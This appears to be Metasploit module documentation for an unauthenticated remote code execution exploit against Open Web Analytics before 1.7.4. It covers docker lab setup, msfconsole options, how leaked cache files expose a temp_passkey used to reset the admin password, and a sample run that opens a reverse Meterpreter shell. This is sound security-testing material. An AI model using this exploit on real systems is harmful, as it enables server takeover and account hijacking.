## Vulnerable Application

Open Web Analytics (OWA) before 1.7.4 allows an unauthenticated
remote attacker to obtain sensitive user information, which can be
used to gain admin privileges by leveraging cache hashes. This occurs
because files generated with '<?php (instead of the intended "<?php sequence) aren't
handled by the PHP interpreter.

## Verification Steps

1. Start a vulnerable instance of OWA using docker
    - Download https://github.com/Pflegusch/CVE-2022-24637/blob/main/deployment/docker-compose.yml
    - Start the containers: `docker compose up -d`
    - Open http://127.0.0.1:80/
    - Follow installation steps using the envs from the `docker-compose.yml` file
        - Public URL: `http://127.0.0.1/`
        - Database Host (`docker inspect <db-container>` and get `IPAddress`, e.g `172.22.0.2`)
        - Database Port: `3306`
        - Database Name: `owa`
        - Database User: `owa`
        - Database Password: `Demo12+#`
        - Continue
        - Site Domain: `http://127.0.0.1`
        - Admin name: `admin`
        - E-Mail: `admin@admin.com`
        - Password: `Demo12+#`
        - Continue

2. Start `msfconsole`
3. `use exploit/multi/http/open_web_analytics_rce`
4. `set RHOSTS 127.0.0.1`
5. `set RPORT 80`
6. `set SSL false`
7. `set LHOST 172.22.0.1` -> this needs to be bridge IP that got created with the `docker compose up -d` command
8. `check`
9. `run`

## Options
### Password

When exploiting the target, the password of the attacked user will be overwritten with this password.

### Username

The user that will be targeted with this exploit.

## Advanced Options
### SearchLimit

The exploit works by retrieving a `temp_passkey` value from a cache file that gets created for each user when trying to login with it.
Since the `/owa-data/caches/` directory is publicly accessible, we can retrieve these cache files. The exact path for the cache files
depends on the `user_id` and can get calculated with that. This option defines how many calculated paths, starting from 0, should be
checked for cache files with the `temp_passkey` value in it.

## Scenarios
### Version 1.7.3 using docker deployment from above
```
msf6 exploit(multi/http/open_web_analytics_rce) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(multi/http/open_web_analytics_rce) > set LHOST 172.22.0.1
LHOST => 172.22.0.1
msf6 exploit(multi/http/open_web_analytics_rce) > run

[*] Started reverse TCP handler on 172.22.0.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Open Web Analytics 1.7.3 is vulnerable
[+] Connected to http://127.0.0.1/ successfully!
[*] Attempting to find cache of 'admin' user
[+] Found temporary password for user 'admin': 85038e7e9f541ae4c4939d3044e628a5
[+] Changed the password of 'admin' to 'pwned'
[+] Logged in as admin user
[*] Creating log file
[+] Wrote payload to file
[*] Sending stage (39927 bytes) to 172.22.0.3
[+] Deleted QY0yivK4.php
[*] Meterpreter session 1 opened (172.22.0.1:4444 -> 172.22.0.3:55434) at 2023-03-15 01:28:54 +0100
[+] Triggering payload! Check your listener!

meterpreter > pwd
/var/www/html/owa-data/caches
meterpreter > getuid
Server username: www-data
meterpreter >
```
